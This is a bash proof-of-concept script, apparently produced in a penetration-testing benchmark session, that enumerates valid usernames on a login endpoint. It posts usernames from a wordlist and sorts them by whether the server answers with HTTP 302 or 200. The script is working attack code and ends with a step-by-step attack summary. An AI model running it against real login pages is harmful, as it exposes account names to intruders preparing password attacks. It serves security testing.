#!/bin/bash
# POC: Demonstrates user enumeration via inconsistent HTTP response codes on the main login endpoint (POST /). Valid usernames return HTTP 302 redirects, while invalid usernames return HTTP 200 with error messages.
# Target: ./repo
# Created: 2025-11-04T14:57:57.047Z
# Session: benchmark-XBEN-027-24-mhknopkv

# User Enumeration via Main Login Endpoint (POST /)
# Demonstrates how inconsistent response codes reveal valid usernames
# Valid users: HTTP 302 redirect to /password/{username}
# Invalid users: HTTP 200 with "User not found" error

TARGET="${1:-http://localhost:8080}"
WORDLIST="${2:-/tmp/user_enum_test.txt}"

# Create a test wordlist if not provided
if [ ! -f "$WORDLIST" ]; then
    cat > "$WORDLIST" << 'EOF'
test
admin
nonexistent
user123
fakename
EOF
fi

echo "[*] User Enumeration POC for Main Login Endpoint"
echo "[*] Target: $TARGET"
echo "[*] Wordlist: $WORDLIST"
echo ""

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

VALID_USERS=()
INVALID_USERS=()

while IFS= read -r username; do
    # Skip empty lines and comments
    [[ -z "$username" || "$username" =~ ^#.*$ ]] && continue
    
    # Test with curl, capturing HTTP status code
    RESPONSE=$(curl -s -i -X POST "$TARGET/" \
        -d "username=$username&password=wrong" \
        -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
    
    HTTP_CODE=$(echo "$RESPONSE" | head -n 1 | awk '{print $2}')
    REDIRECT=$(echo "$RESPONSE" | grep -i "Location:" | awk '{print $2}' | tr -d '\r')
    ERROR_MSG=$(echo "$RESPONSE" | grep -i "User not found" | head -1)
    
    # Analyze response
    if [ "$HTTP_CODE" == "302" ]; then
        echo -e "${GREEN}[+] VALID USER FOUND${NC}: $username (HTTP $HTTP_CODE, redirects to $REDIRECT)"
        VALID_USERS+=("$username")
    elif [ "$HTTP_CODE" == "200" ] && [ ! -z "$ERROR_MSG" ]; then
        echo -e "${RED}[-] Invalid user${NC}: $username (HTTP $HTTP_CODE, 'User not found' message)"
        INVALID_USERS+=("$username")
    elif [ "$HTTP_CODE" == "200" ]; then
        echo -e "${YELLOW}[?] Ambiguous${NC}: $username (HTTP $HTTP_CODE, no 'User not found' detected)"
    else
        echo -e "${YELLOW}[?] Unknown response${NC}: $username (HTTP $HTTP_CODE)"
    fi
done < "$WORDLIST"

echo ""
echo "========== ENUMERATION RESULTS =========="
echo -e "${GREEN}Valid Users Found (${#VALID_USERS[@]}):${NC}"
for user in "${VALID_USERS[@]}"; do
    echo "  - $user"
done

echo ""
echo -e "${RED}Invalid Users Tested (${#INVALID_USERS[@]}):${NC}"
for user in "${INVALID_USERS[@]}"; do
    echo "  - $user"
done

echo ""
echo "========== VULNERABILITY CONFIRMED =========="
if [ ${#VALID_USERS[@]} -gt 0 ]; then
    echo -e "${GREEN}SUCCESS: User enumeration vulnerability confirmed!${NC}"
    echo "Attack Method:"
    echo "  1. Submit login with username from wordlist"
    echo "  2. Check if response is HTTP 302 (valid user) or HTTP 200 (invalid user)"
    echo "  3. Build list of valid usernames without needing passwords"
    exit 0
else
    echo -e "${RED}No valid users detected - verify target is running${NC}"
    exit 1
fi